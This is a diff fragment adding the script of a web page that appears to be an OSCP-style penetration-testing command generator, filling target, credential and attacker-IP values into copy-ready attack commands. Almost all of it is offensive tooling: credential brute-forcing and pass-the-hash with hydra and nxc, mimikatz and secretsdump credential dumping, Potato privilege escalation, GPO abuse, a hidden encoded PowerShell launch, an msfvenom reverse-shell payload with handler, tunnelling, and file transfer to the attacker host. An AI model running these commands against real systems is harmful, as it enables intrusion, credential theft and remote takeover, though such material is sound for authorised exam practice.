+      const targetNet = target !== "<target_ip>" ? cidr24Network(target) : "<target_network>/24";
+      const allLastOctets = targets.map(lastOctet).join(" ");
+
+      const user = selectedOrFallback("userSelect", "<user>");
+      const password = selectedOrFallback("passwordSelect", "<password>");
+      const hash = selectedOrFallback("hashSelect", "<hash>");
+      const domain = selectedOrFallback("domainInput", "<domain>");
+      const kaliIp = selectedOrFallback("kaliIpInput", "<kali_ip>");
+      const lport = selectedOrFallback("lportInput", "<LPORT>");
+      const service = protocolValue();
+      const filename = document.getElementById("filenameSelect").value;
+
+      document.getElementById("mkdirCommand").textContent =
+        allLastOctets ? `mkdir -p ${allLastOctets}` : "Paste targets to generate folder command.";
+
+      document.getElementById("nmapCommand").textContent =
+        `sudo nmap -sV -sC -Pn -oA challenge/${last}/${last} ${target}`;
+
+      document.getElementById("nmapSnmpCommand").textContent =
+        `sudo nmap -sU -oA challenge/${last}/${last}_UDP ${target}`;
+
+      document.getElementById("gobusterCommand").textContent =
+        `gobuster dir -u http://${target} -w /usr/share/wordlists/dirb/common.txt -o challenge/${last}/gobuster -x txt,pdf,config,conf,php,bak`;
+
+      document.getElementById("hydraCommand1").textContent =
+        `hydra -L user.txt -P password.txt ${service}://${target}`;
+      document.getElementById("hydraCommand2").textContent =
+        `hydra -L user.txt -p '${password}' ${service}://${target}`;
+      document.getElementById("hydraCommand3").textContent =
+        `hydra -l '${user}' -P password.txt ${service}://${target}`;
+      document.getElementById("hydraCommand4").textContent =
+        `hydra -l '${user}' -p '${password}' ${service}://${target}`;
+
+      document.getElementById("nxcPasswordCommand1").textContent =
+        `nxc ${service} ${target} -u user.txt -p password.txt --continue-on-success`;
+      document.getElementById("nxcPasswordCommand2").textContent =
+        `nxc ${service} ${target} -u user.txt -p '${password}' --continue-on-success`;
+      document.getElementById("nxcPasswordCommand3").textContent =
+        `nxc ${service} ${target} -u '${user}' -p password.txt --continue-on-success`;
+      document.getElementById("nxcPasswordCommand4").textContent =
+        `nxc ${service} ${target} -u '${user}' -p '${password}' --continue-on-success`;
+
+      document.getElementById("nxcHashCommand1").textContent =
+        `nxc ${service} ${target} -u user.txt -H hash.txt --continue-on-success`;
+      document.getElementById("nxcHashCommand2").textContent =
+        `nxc ${service} ${target} -u user.txt -H '${hash}' --continue-on-success`;
+      document.getElementById("nxcHashCommand3").textContent =
+        `nxc ${service} ${target} -u '${user}' -H hash.txt --continue-on-success`;
+      document.getElementById("nxcHashCommand4").textContent =
+        `nxc ${service} ${target} -u '${user}' -H '${hash}' --continue-on-success`;
+
+      document.getElementById("rdpCommand").textContent =
+        `xfreerdp3 /cert:ignore /v:${target} /u:'${user}' /p:'${password}' /drive:share,/home/kali/share`;
+
+      document.getElementById("winrmCommand1").textContent =
+        `evil-winrm -i ${target} -u '${user}' -p '${password}'`;
+      document.getElementById("winrmCommand2").textContent =
+        `evil-winrm -i ${target} -u '${user}' -p '${password}' -S -P 5986`;
+      document.getElementById("winrmCommand3").textContent =
+        `evil-winrm -i ${target} -u '${user}' -H '${hash}'`;
+
+      document.getElementById("printspooferCommand").textContent =
+        `.\\PrintSpoofer64.exe -i -c cmd`;
+
+      document.getElementById("potatoCommand").textContent =
+        `.\\SharpEfsPotato.exe -p ${filename}`;
+
+      document.getElementById("ligoloTunCommand").textContent =
+        `sudo ip tuntap add user kali mode tun ligolo`;
+
+      document.getElementById("ligoloLinkCommand").textContent =
+        `sudo ip link set ligolo up`;
+
+      document.getElementById("ligoloProxyCommand").textContent =
+        `./ligolo-proxy -selfcert -laddr 0.0.0.0:11601`;
+      document.getElementById("ligoloAgentCommand").textContent =
+        `.\\ligolo-agent -connect ${kaliIp}:11601 -ignore-cert`;
+      document.getElementById("ligoloSessionCommand").textContent = `session`;
+      document.getElementById("ligoloIfconfigCommand").textContent = `ifconfig`;
+      document.getElementById("ligoloRouteCommand").textContent =
+        `sudo ip route add ${targetNet} dev ligolo`;
+      document.getElementById("ligoloStartCommand").textContent = `start`;
+
+
+      document.getElementById("johnCrackCommand").textContent =
+        `john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt`;
+      document.getElementById("johnShowCommand").textContent =
+        `john --show hashes.txt`;
+      document.getElementById("hashcatCrackCommand").textContent =
+        `hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force`;
+      document.getElementById("hashcatShowCommand").textContent =
+        `hashcat --show -m 1000 hashes.txt`;
+
+      document.getElementById("impacketPsexecCommand").textContent =
+        `impacket-psexec -hashes :${hash} ${user}@${target}`;
+      document.getElementById("impacketWmiexecCommand").textContent =
+        `impacket-wmiexec -hashes :${hash} ${user}@${target}`;
+      document.getElementById("impacketSecretsdumpPasswordCommand").textContent =
+        `impacket-secretsdump -just-dc ${domain}/${user}:'${password}'@${target}`;
+      document.getElementById("impacketSecretsdumpHashCommand").textContent =
+        `impacket-secretsdump -hashes :${hash} ${domain}/${user}@${target}`;
+
+      document.getElementById("windowsEnumNetUserDomainCommand").textContent =
+        `net user /domain`;
+      document.getElementById("windowsEnumNetUserCommand").textContent =
+        `net user ${user} /domain`;
+      document.getElementById("windowsEnumWhoamiCommand").textContent =
+        `whoami /all`;
+      document.getElementById("windowsEnumSysteminfoCommand").textContent =
+        `systeminfo`;
+      document.getElementById("windowsEnumLocalAdminsCommand").textContent =
+        `net localgroup administrators`;
+      document.getElementById("windowsEnumPasswordPolicyCommand").textContent =
+        `net accounts /domain`;
+
+      document.getElementById("sharpGpoAbuseCommand").textContent =
+        `./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount ${user} --GPOName "Default Domain Policy"`;
+      document.getElementById("gpupdateCommand").textContent =
+        `gpupdate /force`;
+
+      document.getElementById("wmicCommand").textContent =
+        `wmic /node:${target} /user:${user} /password:'${password}' process call create "powershell -nop -w hidden -e JABjAGwAaQ......gBOAGUAdAA"`;
+
+      document.getElementById("bloodhoundPythonCommand").textContent =
+        `bloodhound-python -u '${user}' -p '${password}' -d ${domain} -ns ${target} -c All`;
+      document.getElementById("bloodhoundCePythonCommand").textContent =
+        `bloodhound-ce-python -u '${user}' -p '${password}' -d ${domain} -ns ${target} -c All`;
+      document.getElementById("bloodhoundPsBypassCommand").textContent =
+        `powershell -ep bypass`;
+      document.getElementById("bloodhoundImportCommand").textContent =
+        `Import-Module .\\Sharphound.ps1`;
+      document.getElementById("bloodhoundDotSourceCommand").textContent =
+        `. .\\Sharphound.ps1`;
+      document.getElementById("bloodhoundInvokeCommand").textContent =
+        `Invoke-BloodHound -CollectionMethod All -OutputDirectory .`;
+
+      document.getElementById("bhQueryDomainAdmins").textContent =
+        `All Domain Admins`;
+      document.getElementById("bhQueryShortestDomainAdmins").textContent =
+        `Shortest Paths to Domain Admins`;
+      document.getElementById("bhQueryShortestOwned").textContent =
+        `Shortest paths from Owned objects`;
+      document.getElementById("bhQueryDomainUsersRdp").textContent =
+        `where Domain Users can RDP`;
+      document.getElementById("bhQueryDomainUsersLocalAdmins").textContent =
+        `Computers where Domain Users are Local administrators`;
+      document.getElementById("bhQueryKerberoastable").textContent =
+        `All Kerberoastable user`;
+
+      document.getElementById("mimikatzCommand").textContent =
+        `.\\mimikatz.exe "privilege::debug" "token::elevate" "log mimikatz.log" "lsadump::sam" "sekurlsa::logonpasswords" "log"`;
+
+      document.getElementById("kaliNcListenerCommand").textContent =
+        `nc -lvnp 9001 > file.file`;
+      document.getElementById("targetNcUploadCommand").textContent =
+        `cmd.exe /c ".\\nc.exe ${kaliIp} 9001 < file.file"`;
+      document.getElementById("targetHttpServerCommand").textContent =
+        `python -m http.server 80`;
+
+      document.getElementById("wgetCommand").textContent =
+        `wget http://${kaliIp}/${filename}`;
+      document.getElementById("curlCommand").textContent =
+        `curl http://${kaliIp}/${filename} -o ${filename}`;
+      document.getElementById("iwrCommand").textContent =
+        `iwr -uri http://${kaliIp}/${filename} -OutFile ${filename}`;
+      document.getElementById("certutilCommand").textContent =
+        `certutil -urlcache -f http://${kaliIp}/${filename} ${filename}`;
+
+      document.getElementById("msfvenomCommand").textContent =
+        `msfvenom -p windows/x64/shell_reverse_tcp LPORT=${lport} LHOST=${kaliIp} -f exe -o shell.exe`;
+
+      document.getElementById("handlerCommand1").textContent = `msfconsole`;
+      document.getElementById("handlerCommand2").textContent = `use multi/handler`;
+      document.getElementById("handlerCommand3").textContent = `set LHOST ${kaliIp}`;
+      document.getElementById("handlerCommand4").textContent = `set LPORT ${lport}`;
+      document.getElementById("handlerCommand5").textContent = `set ExitOnSession false`;
+      document.getElementById("handlerCommand6").textContent = `run -j -z`;
+      document.getElementById("handlerCommand7").textContent = `sessions`;
+      document.getElementById("handlerCommand8").textContent = `sessions -i `;
+      document.getElementById("handlerCommand9").textContent = `sessions -k `;
+
+      saveState();
+    }
+
+    function fallbackCopy(text) {
+      const textarea = document.createElement("textarea");
+      textarea.value = text;
+      textarea.style.position = "fixed";
+      textarea.style.left = "-9999px";
+      document.body.appendChild(textarea);
+      textarea.focus();
+      textarea.select();
+      const successful = document.execCommand("copy");
+      document.body.removeChild(textarea);
+      return successful;
+    }
+
+    async function copyCommand(commandId, statusId) {
+      const command = document.getElementById(commandId).textContent;
+      const status = document.getElementById(statusId);
+
+      try {
+        if (navigator.clipboard && window.isSecureContext) {
+          await navigator.clipboard.writeText(command);
+        } else if (!fallbackCopy(command)) {
+          throw new Error("Fallback copy failed");
+        }
+
+        status.textContent = "Copied";
+        setTimeout(() => status.textContent = "", 1200);
+      } catch (error) {
+        status.textContent = "Copy failed";
+        setTimeout(() => status.textContent = "", 1600);
+      }
+    }
+
+    async function copyAllCommands() {
+      const allCommands = commandIds
+        .map(id => document.getElementById(id).textContent)
+        .join("\n\n");
+
+      try {
+        if (navigator.clipboard && window.isSecureContext) {
+          await navigator.clipboard.writeText(allCommands);
+        } else if (!fallbackCopy(allCommands)) {
+          throw new Error("Fallback copy failed");
+        }
+
+        document.getElementById("allStatus").textContent = "Copied all";
+        setTimeout(() => document.getElementById("allStatus").textContent = "", 1200);
+      } catch (error) {
+        document.getElementById("allStatus").textContent = "Copy failed";
+        setTimeout(() => document.getElementById("allStatus").textContent = "", 1600);
+      }
+    }
+
+    function saveState() {
+      stateKeys.forEach(id => {
+        const element = document.getElementById(id);
+        localStorage.setItem("oscp_" + id, element.value);
+      });
+    }
+
+    function loadState() {
+      stateKeys.forEach(id => {
+        const saved = localStorage.getItem("oscp_" + id);
+        if (saved !== null) {
+          const element = document.getElementById(id);
+          const isSelect = element.tagName.toLowerCase() === "select";
+          const optionExists = isSelect && Array.from(element.options).some(option => option.value === saved);
+
+          if (!isSelect || optionExists) {
+            element.value = saved;
+          }
+        }
+      });
+    }
+
+    function bindEvents() {
+      const watchedIds = [
+        ...stateKeys,
+        "targetSelect",
+        "userSelect",
+        "passwordSelect",
+        "hashSelect"
+      ];
+
+      watchedIds.forEach(id => {
+        document.getElementById(id).addEventListener("input", updateCommands);
+        document.getElementById(id).addEventListener("change", updateCommands);
+      });
+    }
+
+    function jumpToTop() {
+      window.scrollTo({ top: 0, behavior: "smooth" });
+    }
+
+    loadState();
+    bindEvents();
+    updateCommands();
+  </script>
+</body>
+</html>
